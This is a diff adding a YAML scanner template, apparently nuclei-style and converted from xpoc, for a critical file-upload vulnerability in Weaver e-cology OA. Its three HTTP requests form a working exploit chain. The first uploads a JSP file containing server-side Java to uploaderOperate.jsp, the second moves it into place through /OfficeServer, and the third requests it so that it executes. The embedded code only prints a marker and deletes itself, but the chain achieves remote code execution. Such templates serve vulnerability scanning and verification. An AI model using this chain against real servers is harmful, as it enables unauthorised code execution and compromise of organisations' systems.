@@ -1,0 +1,51 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-456781
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa File_Upload Ct 456781
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-456781'
+  tags: fileupload
+  reference:
+  - https://planet.vulbox.com/detail/MTEwMjk=
+http:
+- method: POST
+  path:
+  - /workrelate/plan/util/uploaderOperate.jsp
+  body: "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data;\
+    \ name=\"secId\"\r\n\r\n1\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition:\
+    \ form-data; name=\"Filedata\"; filename=\"{{s1}}.jsp\"\r\n\r\n<% out.println(\"\
+    {{s2}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();\
+    \ %>\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data;\
+    \ name=\"plandetailid\"\r\n\r\n1\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - fileid
+- method: POST
+  path:
+  - /OfficeServer
+  body: "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data;\
+    \ name=\"aaa\"\r\n\r\n{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"\
+    imagefileid4pic\":\"{{id}}\"}\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /{{s1}}.jsp
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
